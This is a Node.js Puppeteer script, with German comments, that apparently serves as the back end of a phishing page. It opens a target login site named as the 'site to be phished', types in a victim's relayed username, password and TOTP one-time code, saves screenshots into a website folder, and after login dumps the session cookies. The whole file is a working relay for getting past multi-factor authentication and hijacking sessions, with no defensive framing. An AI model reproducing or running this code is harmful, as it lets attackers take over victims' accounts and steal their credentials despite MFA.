const puppeteer = require('puppeteer');
const readline = require('readline');

(async () => {
  const browser = await puppeteer.launch({ headless: true });
  const page = await browser.newPage();
  const screenshotfile = '../website/grafik.png';
  const screenypath = '../website/screenshots/';
  const mfscreenshotfile = '../website/mf.png';


  console.log('Puppeteer ready. Type a command (e.g. "goto https://example.com", "screenshot", or "exit")');

  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    terminal: false
  });

  rl.on('line', async (line) => {
    const [command, ...args] = line.trim().split(' ');
    const argStr = args.join(' ');

    try {
      switch (command) {
        case 'goto':
          console.log(`Navigating to ${argStr}...`);
          await page.goto('https://url_der_zu_phishenden_webseite.de');
          console.log('Navigation complete.');

          break;

        case 'screenshot':
          console.log('Create Screenshot...');
          const screeny = screenypath + argStr;
          await page.setViewport({width: 1920, height: 1080});
          await page.screenshot({ path: screeny });
          console.log(`Screenyshot saved to ${argStr}`);
          break;

        //Input Username
        case 'user':
          console.log(`Login User: ${argStr}...`);
          const resultsSelector = 'xpath=//input[@id="j_username"]';
          await page.waitForSelector(resultsSelector);
          await page.type(resultsSelector, argStr);
          await page.click('xpath=//button[@id="logOnFormSubmit"]');
          break;

        //Input Password
        case 'pw':
          console.log(`pw command `);
          const pwSelector = 'xpath=//input[@id="j_password"]';
          await page.waitForSelector(pwSelector);
          await page.type(pwSelector, argStr);
          await page.click('xpath=//button[@id="logOnFormSubmit"]');
          break;

        case 'mfmethod':
          console.log(`MF Method: ${argStr}...`);
          //Aktuell: Automatische Auswahl TOTP Authentifikation
          //Falls tatsächlicher Select umgesetzt wird, muss case 'mf' auch evtl. angepasst werden
          const totp = 'xpath=//button[@id="tfaChoiceTotpButton"]'
          await page.waitForSelector(totp);
          await page.click(totp);

          break;

        case 'mf':
          console.log(`mf command ${argStr}`);
          const mfSelector = 'xpath=//input[@id="j_otpcode"]';
          await page.waitForSelector(mfSelector);
          await page.type(mfSelector, argStr);
          await page.click('xpath=//button[@id="logon_continue"]');

          //Cookie auslesen
          await page.waitForSelector('xpath=//div[@id="profile-header-name"]');
          const cookies = await page.cookies();
          console.log(cookies);
          break


        case 'exit':
          console.log('Closing browser...');
          await browser.close();
          rl.close();
          process.exit(0);
          break;

        default:
          console.log(`Unknown command: ${command}`);
      }
    } catch (err) {
      console.error('Error executing command:', err.message);
    }
  });
})();

